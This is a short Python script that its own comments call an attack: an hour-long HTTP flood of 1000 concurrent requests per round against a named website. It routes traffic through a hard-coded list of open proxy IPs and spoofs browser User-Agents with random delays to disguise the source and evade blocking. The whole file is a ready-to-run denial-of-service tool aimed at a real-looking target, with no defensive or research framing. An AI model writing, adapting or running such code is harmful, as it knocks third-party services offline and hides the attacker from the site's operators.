import asyncio
import aiohttp
import random
import time

# Target URL
target_url = "https://thooto.com"

# Number of requests to send concurrently
concurrent_requests = 1000

# Duration of the attack in seconds
duration = 3600  # 1 hour

# List of proxy servers
proxies = [
    "http://72.10.160.90:21529",
    "http://15.156.24.206:80",
    "http://65.1.244.232:80",
    "http://63.32.1.88:80",
    "http://3.127.62.252:80",
    "http://15.236.106.236:3128",
    "http://15.157.30.77:80",
    "http://54.152.3.36:80",
    "http://13.37.59.99:3128",
    "http://18.228.198.164:80",
    "http://35.72.118.126:80",
    "http://99.80.11.54:80",
    "http://204.236.176.61:80",
    "http://35.79.120.242:3128",
    "http://52.67.10.183:80",
    "http://13.38.176.104:3128",
    "http://18.135.133.116:3128",
    "http://67.43.236.2:21311",
    "http://72.10.160.90:15281",
    "http://58.246.58.15:9002",
    "http://91.202.230.219:8080",
    "http://20.210.113.32:8123",
]

# List of User-Agent strings to simulate different browsers/devices
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1",
    # Add more user agents here
]

async def send_request(session):
    # Randomly select a User-Agent
    headers = {
        "User-Agent": random.choice(user_agents)
    }

    # Optionally select a random proxy
    proxy = random.choice(proxies) if proxies else None

    try:
        async with session.get(target_url, headers=headers, proxy=proxy) as response:
            print(f"Status Code: {response.status}")
            # Random delay between requests to simulate real user behavior
            await asyncio.sleep(random.uniform(0.1, 2.0))
    except Exception as e:
        print(f"Request failed: {e}")

async def attack():
    timeout = aiohttp.ClientTimeout(total=None)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        end_time = time.time() + duration
        tasks = []
        while time.time() < end_time:
            for _ in range(concurrent_requests):
                task = asyncio.ensure_future(send_request(session))
                tasks.append(task)
            await asyncio.gather(*tasks)

# Run the attack
loop = asyncio.get_event_loop()
loop.run_until_complete(attack())

